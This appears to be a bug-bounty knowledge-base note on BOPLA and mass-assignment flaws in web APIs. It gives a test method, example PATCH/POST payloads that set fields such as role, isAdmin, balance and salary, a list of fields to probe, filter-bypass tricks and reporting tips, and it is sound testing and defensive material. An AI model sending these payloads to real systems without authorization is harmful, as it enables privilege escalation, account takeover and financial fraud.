---
title: "BOPLA and Mass Assignment"
type: technique
tags: [api, bopla, mass-assignment, authorization, privilege-escalation, owasp-api-top10]
created: 2026-08-17
updated: 2026-08-17
sources: []
related: ["[[api-security]]", "[[bola]]", "[[bfla]]", "[[idor]]"]
status: draft
severity_range: "MEDIUM-CRITICAL"
---

# BOPLA and Mass Assignment

Complements [[api-security]] and the `hunt-api` skill. Focus here is property-level authorization, not generic API basics.

## Overview

**BOPLA** (Broken Object Property Level Authorization) occurs when an API lets users modify existing object properties that should be restricted (for example, the `role` field). **Mass Assignment** occurs when the API automatically accepts additional, unanticipated properties (for example, an `isAdmin` field added by the attacker). Both exploit the lack of granular property-level control.

## Impact

- **Privilege escalation**: user -> admin by modifying role/privilege
- **Financial fraud**: modifying salary, accountBalance, subscription
- **Business-control bypass**: plan upgrade without payment
- **Data manipulation**: altering other users' sensitive data

## Where to look

- PATCH/PUT endpoints that update user profiles
- Registration endpoints (POST /api/register)
- Account-update endpoints (PATCH /api/account/update)
- Any endpoint accepting a JSON body with object properties
- API documentation listing internal/administrative fields

## Test methodology

### BOPLA
1. GET the resource to see all returned properties.
2. Identify sensitive fields (role, privilege, subscription, salary, is_admin).
3. Send PATCH/PUT attempting to modify those fields.
4. Verify whether the modification was accepted.

### Mass assignment
1. Review the API documentation for non-visible fields.
2. Test deprecated versions that may list removed parameters.
3. Add common fields (isAdmin, role, privilege, credits, verified) to create/update requests.
4. Use a parameter-discovery tool (arjun / param-miner) to find hidden parameters.

## Payloads

### BOPLA - privilege escalation
```json
PATCH /api/v1/user/me
{"first_name": "John", "role": "admin"}

PATCH /api/v1/user/me
{"subscription": "VIP"}

PATCH /api/v1/user/me
{"salary": "99999"}

PATCH /api/v1/user/me
{"verified": true, "email_verified": true}
```

### Mass assignment - adding properties
```json
POST /api/v1/register
{"username": "user", "password": "pass", "isAdmin": true}

POST /api/v1/register
{"username": "user", "password": "pass", "role": "admin"}

PATCH /api/v1/account/update
{"name": "John", "accountBalance": "87999"}

PATCH /api/v1/account/update
{"name": "John", "credits": 99999, "premium": true}
```

### Common fields to test
```
role, isAdmin, is_admin, admin, privilege, permission, permissions
subscription, plan, tier, credits, balance, accountBalance
verified, email_verified, phone_verified, approved
active, enabled, blocked, banned
group, group_id, organization_id, team_id
```

## Common bypasses

- Test different Content-Types (application/json, application/x-www-form-urlencoded).
- Send fields as an array: `"role": ["admin"]`.
- Use case variations: `isAdmin`, `isadmin`, `IsAdmin`, `is_admin`.
- Test older API versions that may accept removed parameters.
- Send nested fields: `{"user": {"role": "admin"}}`.

## Real examples

- PATCH /api/user/me with `"role": "admin"` accepted without validation -> privilege escalation.
- POST /api/register with `"isAdmin": true` creates an admin account -> full system access.
- PATCH /api/user/me with `"subscription": "VIP"` -> free upgrade.
- PATCH /api/user/me with `"salary": "99999"` -> internal financial fraud.

### Triple field write (Critical)
A financial-account endpoint with no allowlist accepted writes to three sensitive fields simultaneously:
- `bank_account` -> redirect funds to any account
- `email` -> account takeover via password reset
- `balance` -> set an arbitrary value (zero or millions)

Discovered by chaining an IDOR read (sequential IDs) with iteration over writable fields mapped in minified JS. Notable because it exposed three independent fraud vectors on a single endpoint.

## Report tips

- Show the BEFORE and AFTER state of the modification (GET -> PATCH -> GET).
- Clearly distinguish BOPLA (existing property) from Mass Assignment (new property).
- Include a table comparing BOPLA vs Mass Assignment vs BOLA for clarity.
- Calculate financial impact where possible (salary modification, subscription bypass).
- Recommend: property allowlisting, RBAC, input validation, JSON Schema enforcement.
